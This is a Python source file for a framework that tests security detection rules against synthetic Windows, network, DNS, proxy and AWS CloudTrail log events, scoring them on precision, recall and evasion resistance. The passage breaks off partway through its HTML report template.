#!/usr/bin/env python3
"""
Detection Rule Validation Framework v2
=======================================
A test harness for validating detection rules against synthetic
attack telemetry and benign noise.

Usage:
    1. Define your rule logic in a DetectionEngine subclass
    2. Generate synthetic events using a TelemetryGenerator subclass
    3. Run the TestRunner to get a full validation report
    4. Optionally compare two rule versions with RuleComparator

This framework supports any detection rule format -- you implement
the matching logic in Python, and the framework handles test
orchestration, metrics, and reporting.

CLI:
    python detection_validator.py                    # Run built-in example
    python detection_validator.py --events data.json # Load events from file
    python detection_validator.py --compare          # Run original vs improved
    python detection_validator.py --html report.html # Export HTML report
"""

import argparse
import datetime
import hashlib
import html as _html
import json
import random
import re
import string
import sys
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Optional
from collections import Counter
from pathlib import Path

try:
    import regex as re_timeout
except ImportError:  # pragma: no cover - optional hardening dependency
    re_timeout = None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# DATA MODELS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class EventCategory(Enum):
    TRUE_POSITIVE = "true_positive"            # Attack activity -- rule SHOULD fire
    TRUE_NEGATIVE = "true_negative"            # Benign activity -- rule should NOT fire
    FALSE_POSITIVE_CANDIDATE = "fp_candidate"  # Tricky benign -- stress test
    EVASION = "evasion"                        # Attack variant -- bypass attempt


@dataclass
class SyntheticEvent:
    """A single synthetic log event for testing."""
    event_id: str
    category: EventCategory
    description: str
    log_data: dict
    attack_technique: str = ""          # MITRE ATT&CK ID (e.g., T1218.011)
    expected_detection: bool = True     # Should the rule detect this?
    notes: str = ""
    tags: list = field(default_factory=list)  # Freeform labels for grouping/filtering
    severity: str = ""                  # Expected severity if detected

    def to_dict(self) -> dict:
        return {
            "event_id": self.event_id,
            "category": self.category.value,
            "description": self.description,
            "log_data": self.log_data,
            "attack_technique": self.attack_technique,
            "expected_detection": self.expected_detection,
            "notes": self.notes,
            "tags": self.tags,
            "severity": self.severity,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "SyntheticEvent":
        return cls(
            event_id=d["event_id"],
            category=EventCategory(d["category"]),
            description=d["description"],
            log_data=d["log_data"],
            attack_technique=d.get("attack_technique", ""),
            expected_detection=d.get("expected_detection", True),
            notes=d.get("notes", ""),
            tags=d.get("tags", []),
            severity=d.get("severity", ""),
        )


@dataclass
class DetectionResult:
    """Result of running a single event through the detection engine."""
    event_id: str
    matched: bool
    matched_conditions: list = field(default_factory=list)
    confidence_score: float = 0.0
    execution_time_ms: float = 0.0      # How long the evaluation took


@dataclass
class TestResult:
    """Combined test result for one event."""
    event: SyntheticEvent
    detection: DetectionResult
    outcome: str = ""                   # TP, FP, TN, FN
    passed: bool = False                # Did reality match expectation?

    def __post_init__(self):
        if self.event.expected_detection and self.detection.matched:
            self.outcome = "TP"
            self.passed = True
        elif self.event.expected_detection and not self.detection.matched:
            self.outcome = "FN"
            self.passed = False
        elif not self.event.expected_detection and self.detection.matched:
            self.outcome = "FP"
            self.passed = False
        elif not self.event.expected_detection and not self.detection.matched:
            self.outcome = "TN"
            self.passed = True


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TELEMETRY GENERATOR (BASE)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class TelemetryGenerator:
    """
    Base class for generating synthetic log events.

    Subclass this and implement the generate_* methods for your
    specific log source and attack technique.

    Built-in helpers cover:
      - Sysmon process creation (EventID 1)
      - Sysmon network connection (EventID 3)
      - Sysmon file creation (EventID 11)
      - Sysmon DNS query (EventID 22)
      - Windows Security process creation (EventID 4688)
      - Windows Security logon (EventID 4624)
      - Network flow / firewall events
      - DNS query logs
      - Web proxy / HTTP logs
      - AWS CloudTrail events
    """

    def __init__(self, seed: int = 42):
        self.rng = random.Random(seed)
        self._event_counter = 0

    def _next_id(self) -> str:
        self._event_counter += 1
        return f"EVT-{self._event_counter:04d}"

    # -- Randomization primitives --

    def _random_hostname(self) -> str:
        prefixes = ["WS", "PC", "LT", "SRV", "DC", "APP", "DB", "WEB", "FS", "ADMIN"]
        return f"{self.rng.choice(prefixes)}-{self.rng.randint(1000, 9999)}"

    def _random_username(self) -> str:
        first = ["john", "jane", "admin", "svc", "mike", "sarah", "deploy",
                 "backup", "monitor", "build", "david", "emma", "robert", "lisa"]
        last = ["smith", "doe", "ops", "account", "johnson", "williams", "brown",
                "jones", "davis", "miller", "wilson", "moore", "taylor", "thomas"]
        return f"{self.rng.choice(first)}.{self.rng.choice(last)}"

    def _random_domain(self) -> str:
        return self.rng.choice(["CORP", "CONTOSO", "ACME", "INTERNAL", "PROD"])

    def _random_pid(self) -> int:
        return self.rng.randint(1000, 65535)

    def _random_guid(self) -> str:
        import uuid as _uuid
        # Generate a deterministic UUID-format GUID seeded via the instance RNG.
        # We seed the stdlib random with an integer from our seeded RNG so the
        # output remains reproducible across test runs, but is correctly formatted
        # as a UUID (xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx).
        seed_int = self.rng.getrandbits(128)
        return str(_uuid.UUID(int=seed_int, version=4))

    def _random_timestamp(self, days_back: int = 7) -> str:
        base = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) - datetime.timedelta(
            seconds=self.rng.randint(0, days_back * 86400)
        )
        return base.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

    def _random_ip(self, internal: bool = True) -> str:
        if internal:
            return f"10.{self.rng.randint(0,255)}.{self.rng.randint(1,254)}.{self.rng.randint(1,254)}"
        return f"{self.rng.randint(1,223)}.{self.rng.randint(0,255)}.{self.rng.randint(0,255)}.{self.rng.randint(1,254)}"

    def _random_mac(self) -> str:
        return ":".join(f"{self.rng.randint(0,255):02x}" for _ in range(6))

    def _random_fqdn(self, malicious: bool = False) -> str:
        if malicious:
            tlds = [".xyz", ".top", ".tk", ".ru", ".cn"]
            words = ["update", "cdn", "sync", "api", "dl", "data", "info"]
            return f"{self.rng.choice(words)}{self.rng.randint(1,999)}{self.rng.choice(tlds)}"
        tlds = [".com", ".net", ".org", ".io"]
        words = ["google", "microsoft", "github", "amazon", "cloudflare", "office365"]
        return f"{self.rng.choice(words)}{self.rng.choice(tlds)}"

    def _random_user_agent(self) -> str:
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Microsoft-CryptoAPI/10.0",
            "Windows-Update-Agent/10.0.10011.16384",
        ]
        return self.rng.choice(agents)

    def _random_hash(self, algo: str = "sha256") -> str:
        length = {"md5": 32, "sha1": 40, "sha256": 64}.get(algo, 64)
        return ''.join(self.rng.choices("0123456789abcdef", k=length))

    def _random_aws_account(self) -> str:
        return ''.join(self.rng.choices("0123456789", k=12))

    def _random_aws_region(self) -> str:
        return self.rng.choice(["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"])

    # -- Base event templates --

    def _base_sysmon_event(self, event_id: int = 1) -> dict:
        """Sysmon EventID 1 (Process Creation) base structure."""
        return {
            "EventID": event_id,
            "UtcTime": self._random_timestamp(),
            "ProcessGuid": self._random_guid(),
            "ProcessId": self._random_pid(),
            "Computer": self._random_hostname(),
            "User": f"{self._random_domain()}\\{self._random_username()}",
            "LogonGuid": self._random_guid(),
            "LogonId": hex(self.rng.randint(0x10000, 0xFFFFF)),
            "TerminalSessionId": self.rng.randint(0, 5),
        }

    def _base_sysmon_network_event(self) -> dict:
        """Sysmon EventID 3 (Network Connection) base structure."""
        base = self._base_sysmon_event(event_id=3)
        base.update({
            "Protocol": self.rng.choice(["tcp", "udp"]),
            "Initiated": self.rng.choice(["true", "false"]),
            "SourceIp": self._random_ip(internal=True),
            "SourcePort": self.rng.randint(49152, 65535),
            "SourceHostname": self._random_hostname(),
            "DestinationIp": self._random_ip(internal=self.rng.choice([True, False])),
            "DestinationPort": self.rng.choice([80, 443, 445, 3389, 8080, 8443, 22, 53]),
            "DestinationHostname": self._random_fqdn(),
        })
        return base

    def _base_sysmon_file_event(self) -> dict:
        """Sysmon EventID 11 (File Created) base structure."""
        base = self._base_sysmon_event(event_id=11)
        base.update({
            "TargetFilename": f"C:\\Users\\{self._random_username()}\\Documents\\file.tmp",
            "CreationUtcTime": self._random_timestamp(),
        })
        return base

    def _base_sysmon_dns_event(self) -> dict:
        """Sysmon EventID 22 (DNS Query) base structure."""
        base = self._base_sysmon_event(event_id=22)
        base.update({
            "QueryName": self._random_fqdn(),
            "QueryStatus": "0",
            "QueryResults": self._random_ip(internal=False),
        })
        return base

    def _base_windows_security_event(self, event_id: int = 4688) -> dict:
        """Windows Security log base structure."""
        return {
            "EventID": event_id,
            "TimeCreated": self._random_timestamp(),
            "Computer": self._random_hostname(),
            "SubjectUserName": self._random_username(),
            "SubjectDomainName": self._random_domain(),
            "SubjectLogonId": hex(self.rng.randint(0x10000, 0xFFFFF)),
        }

    def _base_windows_logon_event(self, logon_type: int = 3) -> dict:
        """Windows Security EventID 4624 (Logon) base structure."""
        base = self._base_windows_security_event(event_id=4624)
        base.update({
            "LogonType": logon_type,
            "TargetUserName": self._random_username(),
            "TargetDomainName": self._random_domain(),
            "IpAddress": self._random_ip(internal=True),
            "IpPort": self.rng.randint(49152, 65535),
            "WorkstationName": self._random_hostname(),
            "LogonProcessName": self.rng.choice(["NtLmSsp", "Kerberos", "Negotiate"]),
            "AuthenticationPackageName": self.rng.choice(["NTLM", "Kerberos"]),
        })
        return base

    def _base_network_event(self) -> dict:
        """Generic network flow / firewall event structure."""
        return {
            "timestamp": self._random_timestamp(),
            "src_ip": self._random_ip(internal=True),
            "src_port": self.rng.randint(49152, 65535),
            "dst_ip": self._random_ip(internal=self.rng.choice([True, False])),
            "dst_port": self.rng.choice([80, 443, 445, 3389, 8080, 8443, 22, 53]),
            "protocol": self.rng.choice(["TCP", "UDP"]),
            "bytes_sent": self.rng.randint(64, 1048576),
            "bytes_received": self.rng.randint(64, 1048576),
            "action": self.rng.choice(["allow", "deny"]),
            "sensor": self._random_hostname(),
        }

    def _base_dns_query_event(self) -> dict:
        """DNS query log event structure (e.g., from DNS server or Zeek)."""
        return {
            "timestamp": self._random_timestamp(),
            "src_ip": self._random_ip(internal=True),
            "query": self._random_fqdn(),
            "query_type": self.rng.choice(["A", "AAAA", "CNAME", "TXT", "MX"]),
            "response_code": self.rng.choice(["NOERROR", "NXDOMAIN", "SERVFAIL"]),
            "answers": [self._random_ip(internal=False)],
            "ttl": self.rng.randint(30, 86400),
            "sensor": self._random_hostname(),
        }

    def _base_proxy_event(self) -> dict:
        """Web proxy / HTTP log event structure."""
        return {
            "timestamp": self._random_timestamp(),
            "src_ip": self._random_ip(internal=True),
            "user": self._random_username(),
            "method": self.rng.choice(["GET", "POST", "PUT", "CONNECT"]),
            "url": f"https://{self._random_fqdn()}/path/{self.rng.randint(1,999)}",
            "status_code": self.rng.choice([200, 301, 302, 403, 404, 500]),
            "user_agent": self._random_user_agent(),
            "bytes_out": self.rng.randint(100, 50000),
            "bytes_in": self.rng.randint(100, 500000),
            "content_type": self.rng.choice(["text/html", "application/json", "application/octet-stream"]),
            "category": self.rng.choice(["Business", "Technology", "Uncategorized"]),
        }

    def _base_cloudtrail_event(self, event_name: str = "DescribeInstances") -> dict:
        """AWS CloudTrail event structure."""
        return {
            "eventVersion": "1.08",
            "eventTime": self._random_timestamp(),
            "eventSource": "ec2.amazonaws.com",
            "eventName": event_name,
            "awsRegion": self._random_aws_region(),
            "sourceIPAddress": self._random_ip(internal=False),
            "userAgent": "aws-cli/2.15.0",
            "userIdentity": {
                "type": self.rng.choice(["IAMUser", "AssumedRole", "Root"]),
                "arn": f"arn:aws:iam::{self._random_aws_account()}:user/{self._random_username()}",
                "accountId": self._random_aws_account(),
                "principalId": self._random_guid()[:20].upper(),
            },
            "requestParameters": {},
            "responseElements": None,
            "errorCode": None,
            "errorMessage": None,
        }

    # -- Override these in your subclass --

    def generate_true_positives(self, count: int = 10) -> list[SyntheticEvent]:
        raise NotImplementedError("Implement in subclass for your specific rule")

    def generate_true_negatives(self, count: int = 15) -> list[SyntheticEvent]:
        raise NotImplementedError("Implement in subclass for your specific rule")

    def generate_fp_candidates(self, count: int = 5) -> list[SyntheticEvent]:
        raise NotImplementedError("Implement in subclass for your specific rule")

    def generate_evasion_samples(self, count: int = 5) -> list[SyntheticEvent]:
        raise NotImplementedError("Implement in subclass for your specific rule")

    def generate_all(self, tp=10, tn=15, fp=5, evasion=5) -> list[SyntheticEvent]:
        """Generate a full test dataset."""
        events = []
        events.extend(self.generate_true_positives(tp))
        events.extend(self.generate_true_negatives(tn))
        events.extend(self.generate_fp_candidates(fp))
        events.extend(self.generate_evasion_samples(evasion))
        return events

    def export_events(self, events: list[SyntheticEvent], path: str):
        """Serialize events to a JSON file for reuse."""
        data = [e.to_dict() for e in events]
        with open(path, "w") as f:
            json.dump(data, f, indent=2)

    @staticmethod
    def import_events(path: str) -> list[SyntheticEvent]:
        """Load previously exported events from JSON."""
        with open(path) as f:
            data = json.load(f)
        return [SyntheticEvent.from_dict(d) for d in data]


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# DETECTION ENGINE (BASE)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class DetectionEngine:
    """
    Base class for implementing detection rule logic in Python.

    Subclass this and implement the `evaluate` method with your
    rule's specific matching logic.

    Built-in matching utilities:
      - field_equals, field_contains, field_endswith, field_startswith
      - field_regex, field_in, field_exists
      - field_gt, field_lt (numeric comparison)
      - field_any_of, field_all_of (multi-value matching)
      - field_count (count pattern occurrences)
      - field_length_gt, field_length_lt (string length checks)
      - check_process_lineage (parent/grandparent chain)
    """

    def __init__(self, rule_name: str = "Unnamed Rule", rule_metadata: dict = None):
        self.rule_name = rule_name
        self.rule_metadata = rule_metadata or {}

    def evaluate(self, event: dict) -> DetectionResult:
        """
        Evaluate a single log event against the rule.

        Args:
            event: Dictionary representing a single log event

        Returns:
            DetectionResult with match status, conditions, and confidence
        """
        raise NotImplementedError("Implement detection logic in subclass")

    # -- Core field matching utilities --

    @staticmethod
    def field_equals(event: dict, field: str, value: str, case_insensitive: bool = True) -> bool:
        val = event.get(field, "")
        if case_insensitive:
            return str(val).lower() == str(value).lower()
        return str(val) == str(value)

    @staticmethod
    def field_contains(event: dict, field: str, value: str, case_insensitive: bool = True) -> bool:
        val = str(event.get(field, ""))
        if case_insensitive:
            return str(value).lower() in val.lower()
        return str(value) in val

    @staticmethod
    def field_endswith(event: dict, field: str, value: str, case_insensitive: bool = True) -> bool:
        val = str(event.get(field, ""))
        if case_insensitive:
            return val.lower().endswith(str(value).lower())
        return val.endswith(str(value))

    @staticmethod
    def field_startswith(event: dict, field: str, value: str, case_insensitive: bool = True) -> bool:
        val = str(event.get(field, ""))
        if case_insensitive:
            return val.lower().startswith(str(value).lower())
        return val.startswith(str(value))

    @staticmethod
    def field_regex(event: dict, field: str, pattern: str, flags: int = re.IGNORECASE) -> bool:
        val = str(event.get(field, ""))
        if len(pattern) > 512:
            return False
        if re_timeout is not None:
            try:
                return bool(re_timeout.search(pattern, val, flags=flags, timeout=0.02))
            except TimeoutError:
                return False
        return bool(re.search(pattern, val, flags))

    @staticmethod
    def field_in(event: dict, field: str, values: list, case_insensitive: bool = True) -> bool:
        val = str(event.get(field, ""))
        if case_insensitive:
            return val.lower() in [str(v).lower() for v in values]
        return val in [str(v) for v in values]

    @staticmethod
    def field_exists(event: dict, field: str) -> bool:
        return field in event and event[field] is not None and str(event[field]).strip() != ""

    @staticmethod
    def field_gt(event: dict, field: str, threshold: float) -> bool:
        try:
            return float(event.get(field, 0)) > threshold
        except (ValueError, TypeError):
            return False

    @staticmethod
    def field_lt(event: dict, field: str, threshold: float) -> bool:
        try:
            return float(event.get(field, 0)) < threshold
        except (ValueError, TypeError):
            return False

    # -- Extended matching utilities (v2) --

    @staticmethod
    def field_any_of(event: dict, field: str, values: list, case_insensitive: bool = True) -> bool:
        """Check if the field contains ANY of the given values."""
        val = str(event.get(field, ""))
        if case_insensitive:
            val_lower = val.lower()
            return any(str(v).lower() in val_lower for v in values)
        return any(str(v) in val for v in values)

    @staticmethod
    def field_all_of(event: dict, field: str, values: list, case_insensitive: bool = True) -> bool:
        """Check if the field contains ALL of the given values."""
        val = str(event.get(field, ""))
        if case_insensitive:
            val_lower = val.lower()
            return all(str(v).lower() in val_lower for v in values)
        return all(str(v) in val for v in values)

    @staticmethod
    def field_count(event: dict, field: str, pattern: str, case_insensitive: bool = True) -> int:
        """Count how many times a pattern appears in a field value."""
        val = str(event.get(field, ""))
        if case_insensitive:
            return val.lower().count(pattern.lower())
        return val.count(pattern)

    @staticmethod
    def field_length_gt(event: dict, field: str, length: int) -> bool:
        """Check if field value length exceeds a threshold."""
        return len(str(event.get(field, ""))) > length

    @staticmethod
    def field_length_lt(event: dict, field: str, length: int) -> bool:
        """Check if field value length is below a threshold."""
        return len(str(event.get(field, ""))) < length

    @staticmethod
    def check_process_lineage(event: dict, lineage: list[str],
                              image_field: str = "Image",
                              parent_field: str = "ParentImage",
                              case_insensitive: bool = True) -> bool:
        """
        Check if a process matches an expected parent-child lineage.

        Args:
            event: Log event dict
            lineage: List of expected executable names from child to ancestor,
                     e.g. ["rundll32.exe", "powershell.exe"] means rundll32
                     should be a child of powershell.
            image_field: Field containing the child process image path
            parent_field: Field containing the parent process image path

        Returns:
            True if the event's process chain matches the lineage.
        """
        if len(lineage) < 1:
            return True
        image = str(event.get(image_field, ""))
        if case_insensitive:
            image = image.lower()
        if not image.endswith(lineage[0].lower() if case_insensitive else lineage[0]):
            return False
        if len(lineage) >= 2:
            parent = str(event.get(parent_field, ""))
            if case_insensitive:
                parent = parent.lower()
            if not parent.endswith(lineage[1].lower() if case_insensitive else lineage[1]):
                return False
        return True

    @staticmethod
    def field_not_contains(event: dict, field: str, value: str, case_insensitive: bool = True) -> bool:
        """Check that a field does NOT contain a value."""
        return not DetectionEngine.field_contains(event, field, value, case_insensitive)

    @staticmethod
    def check_original_filename(event: dict, expected_name: str,
                                case_insensitive: bool = True) -> bool:
        """
        Check the OriginalFileName field -- useful for detecting renamed binaries.
        Sysmon populates this from the PE header regardless of what the file
        is actually named on disk.
        """
        return DetectionEngine.field_equals(
            event, "OriginalFileName", expected_name, case_insensitive
        )


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TEST RUNNER & REPORTER
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class GradingConfig:
    """Configurable weights for the composite score calculation."""

    def __init__(self, f1_weight: float = 0.4, evasion_weight: float = 0.3,
                 fp_weight: float = 0.3, grade_thresholds: dict = None):
        self.f1_weight = f1_weight
        self.evasion_weight = evasion_weight
        self.fp_weight = fp_weight
        self.grade_thresholds = grade_thresholds or {
            "A": 0.9, "B": 0.8, "C": 0.7, "D": 0.6
        }

    def compute_grade(self, score: float) -> str:
        for grade, threshold in sorted(self.grade_thresholds.items()):
            if score >= threshold:
                result_grade = grade
        # Iterate in order: A >= 0.9, B >= 0.8, etc.
        for grade in ["A", "B", "C", "D"]:
            if score >= self.grade_thresholds.get(grade, 0):
                return grade
        return "F"


class TestRunner:
    """Orchestrates testing and produces validation reports."""

    def __init__(self, engine: DetectionEngine, events: list[SyntheticEvent],
                 grading: GradingConfig = None):
        self.engine = engine
        self.events = events
        self.grading = grading or GradingConfig()
        self.results: list[TestResult] = []

    def run(self) -> list[TestResult]:
        """Execute all events through the detection engine."""
        self.results = []
        for event in self.events:
            t0 = time.perf_counter()
            detection = self.engine.evaluate(event.log_data)
            elapsed = (time.perf_counter() - t0) * 1000
            detection.event_id = event.event_id
            detection.execution_time_ms = round(elapsed, 3)
            result = TestResult(event=event, detection=detection)
            self.results.append(result)
        return self.results

    def get_metrics(self) -> dict:
        """Calculate detection quality metrics."""
        if not self.results:
            self.run()

        counts = Counter(r.outcome for r in self.results)
        tp = counts.get("TP", 0)
        fp = counts.get("FP", 0)
        tn = counts.get("TN", 0)
        fn = counts.get("FN", 0)

        total = len(self.results)
        accuracy = (tp + tn) / total if total else 0
        precision = tp / (tp + fp) if (tp + fp) else 0
        recall = tp / (tp + fn) if (tp + fn) else 0
        f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) else 0

        # Evasion-specific metrics
        evasion_events = [r for r in self.results if r.event.category == EventCategory.EVASION]
        evasion_caught = sum(1 for r in evasion_events if r.detection.matched)
        evasion_total = len(evasion_events)
        evasion_resistance = evasion_caught / evasion_total if evasion_total else 1.0

        # FP candidate metrics
        fp_candidates = [r for r in self.results if r.event.category == EventCategory.FALSE_POSITIVE_CANDIDATE]
        fp_triggered = sum(1 for r in fp_candidates if r.detection.matched)

        # Per-category breakdown
        category_breakdown = {}
        for cat in EventCategory:
            cat_results = [r for r in self.results if r.event.category == cat]
            if cat_results:
                category_breakdown[cat.value] = {
                    "total": len(cat_results),
                    "passed": sum(1 for r in cat_results if r.passed),
                    "failed": sum(1 for r in cat_results if not r.passed),
                    "pass_rate": round(sum(1 for r in cat_results if r.passed) / len(cat_results), 4),
                }

        # Composite score and grade
        g = self.grading
        score = (
            (f1 * g.f1_weight) +
            (evasion_resistance * g.evasion_weight) +
            ((1 - (fp / max(total, 1))) * g.fp_weight)
        )
        grade = g.compute_grade(score)

        # Avg execution time
        avg_time = sum(r.detection.execution_time_ms for r in self.results) / total if total else 0

        return {
            "confusion_matrix": {"TP": tp, "FP": fp, "TN": tn, "FN": fn},
            "accuracy": round(accuracy, 4),
            "precision": round(precision, 4),
            "recall": round(recall, 4),
            "f1_score": round(f1, 4),
            "evasion_resistance": round(evasion_resistance, 4),
            "evasion_caught": evasion_caught,
            "evasion_total": evasion_total,
            "fp_candidates_triggered": fp_triggered,
            "fp_candidates_total": len(fp_candidates),
            "overall_grade": grade,
            "composite_score": round(score, 4),
            "total_events": total,
            "total_passed": sum(1 for r in self.results if r.passed),
            "total_failed": sum(1 for r in self.results if not r.passed),
            "category_breakdown": category_breakdown,
            "avg_execution_time_ms": round(avg_time, 3),
        }

    def print_report(self):
        """Print a formatted validation report to stdout."""
        if not self.results:
            self.run()

        metrics = self.get_metrics()
        cm = metrics["confusion_matrix"]

        print("=" * 80)
        print(f"  DETECTION RULE VALIDATION REPORT")
        print(f"  Rule: {self.engine.rule_name}")
        print(f"  Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 80)

        # -- Confusion Matrix --
        print("\n+------------------------------------------+")
        print("|         CONFUSION MATRIX                 |")
        print("+--------------------+---------------------+")
        print(f"|  True Positives: {cm['TP']:>3} | False Positives: {cm['FP']:>2} |")
        print(f"|  False Negatives: {cm['FN']:>2} | True Negatives: {cm['TN']:>3} |")
        print("+--------------------+---------------------+")

        # -- Key Metrics --
        print(f"\n{'-' * 50}")
        print(f"  Accuracy:           {metrics['accuracy']:.1%}")
        print(f"  Precision:          {metrics['precision']:.1%}")
        print(f"  Recall:             {metrics['recall']:.1%}")
        print(f"  F1 Score:           {metrics['f1_score']:.1%}")
        print(f"  Evasion Resistance: {metrics['evasion_resistance']:.1%}  ({metrics['evasion_caught']}/{metrics['evasion_total']} caught)")
        print(f"  FP Stress Test:     {metrics['fp_candidates_triggered']}/{metrics['fp_candidates_total']} triggered")
        print(f"  Avg Eval Time:      {metrics['avg_execution_time_ms']:.3f} ms")
        print(f"{'-' * 50}")
        print(f"  OVERALL GRADE:      {metrics['overall_grade']}  (composite: {metrics['composite_score']:.2f})")
        print(f"  Tests Passed:       {metrics['total_passed']}/{metrics['total_events']}")
        print(f"{'-' * 50}")

        # -- Per-Category Breakdown --
        if metrics.get("category_breakdown"):
            print(f"\n  Per-Category Results:")
            for cat_name, cat_data in metrics["category_breakdown"].items():
                print(f"    {cat_name:<20} {cat_data['passed']}/{cat_data['total']} passed ({cat_data['pass_rate']:.0%})")

        # -- Per-Event Results --
        print(f"\n{'-' * 90}")
        print(f"  {'ID':<10} {'Category':<16} {'Expected':<10} {'Actual':<10} {'Conf':>5} {'Result':<8} {'Description'}")
        print(f"{'-' * 90}")

        for r in self.results:
            status = "PASS" if r.passed else "FAIL"
            marker = "+" if r.passed else "X"
            expected = "DETECT" if r.event.expected_detection else "IGNORE"
            actual = "DETECT" if r.detection.matched else "IGNORE"
            conf = f"{r.detection.confidence_score:.2f}" if r.detection.matched else "  -  "
            desc = r.event.description[:38]
            cat = r.event.category.value[:14]
            print(f"  {r.event.event_id:<10} {cat:<16} {expected:<10} {actual:<10} {conf:>5} [{marker}] {desc}")

        # -- Failed Events Detail --
        failures = [r for r in self.results if not r.passed]
        if failures:
            print(f"\n{'=' * 80}")
            print(f"  FAILURE DETAILS ({len(failures)} events)")
            print(f"{'=' * 80}")
            for r in failures:
                print(f"\n  [{r.outcome}] {r.event.event_id}: {r.event.description}")
                print(f"  Category: {r.event.category.value}")
                if r.event.notes:
                    print(f"  Notes: {r.event.notes}")
                print(f"  Matched conditions: {r.detection.matched_conditions}")
                log_str = json.dumps(r.event.log_data, indent=2)
                if len(log_str) > 500:
                    log_str = log_str[:500] + "\n  ..."
                print(f"  Log data:\n  {log_str}")

        print(f"\n{'=' * 80}")
        print(f"  END OF REPORT")
        print(f"{'=' * 80}\n")

    def export_report_json(self) -> dict:
        """Export the full report as a JSON-serializable dict."""
        if not self.results:
            self.run()

        return {
            "rule_name": self.engine.rule_name,
            "rule_metadata": self.engine.rule_metadata,
            "timestamp": datetime.datetime.now().isoformat(),
            "metrics": self.get_metrics(),
            "results": [
                {
                    "event_id": r.event.event_id,
                    "category": r.event.category.value,
                    "description": r.event.description,
                    "attack_technique": r.event.attack_technique,
                    "expected_detection": r.event.expected_detection,
                    "actual_detection": r.detection.matched,
                    "matched_conditions": r.detection.matched_conditions,
                    "confidence": r.detection.confidence_score,
                    "execution_time_ms": r.detection.execution_time_ms,
                    "outcome": r.outcome,
                    "passed": r.passed,
                    "log_data": r.event.log_data,
                    "notes": r.event.notes,
                    "tags": r.event.tags,
                }
                for r in self.results
            ],
        }

    def export_html_report(self, path: str):
        """Export a self-contained HTML report."""
        if not self.results:
            self.run()

        metrics = self.get_metrics()
        cm = metrics["confusion_matrix"]

        grade_colors = {"A": "#22c55e", "B": "#84cc16", "C": "#eab308", "D": "#f97316", "F": "#ef4444"}
        grade_color = grade_colors.get(metrics["overall_grade"], "#6b7280")

        rows_html = ""
        for r in self.results:
            status_class = "pass" if r.passed else "fail"
            expected = "DETECT" if r.event.expected_detection else "IGNORE"
            actual = "DETECT" if r.detection.matched else "IGNORE"
            conf = f"{r.detection.confidence_score:.2f}" if r.detection.matched else "-"
            safe_desc = _html.escape(r.event.description[:50])
            rows_html += f"""<tr class="{status_class}">
                <td>{_html.escape(r.event.event_id)}</td>
                <td>{_html.escape(r.event.category.value)}</td>
                <td>{safe_desc}</td>
                <td>{expected}</td><td>{actual}</td>
                <td>{conf}</td>
                <td><span class="badge-{status_class}">{_html.escape(r.outcome)}</span></td>
            </tr>\n"""

        failures_html = ""
        for r in [r for r in self.results if not r.passed]:
            log_snippet = _html.escape(json.dumps(r.event.log_data, indent=2)[:600])
            failures_html += f"""<div class="failure-card">
                <h4>[{_html.escape(r.outcome)}] {_html.escape(r.event.event_id)}: {_html.escape(r.event.description)}</h4>
                <p><strong>Category:</strong> {_html.escape(r.event.category.value)}</p>
                <p><strong>Notes:</strong> {_html.escape(r.event.notes or 'N/A')}</p>
                <p><strong>Matched:</strong> {_html.escape(', '.join(r.detection.matched_conditions) or 'None')}</p>
                <pre>{log_snippet}</pre>
            </div>\n"""

        html = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>Validation Report: {_html.escape(self.engine.rule_name)}</title>
<style>
  body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         max-width: 1100px; margin: 0 auto; padding: 2rem; background: #0f172a; color: #e2e8f0; }}
  h1 {{ color: #f8fafc; }} h2 {{ color: #94a3b8; border-bottom: 1px solid #334155; padding-bottom: 0.5rem; }}
  .grade {{ font-size: 4rem; font-weight: 800; color: {grade_color}; }}
  .metrics-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin: 1rem 0; }}
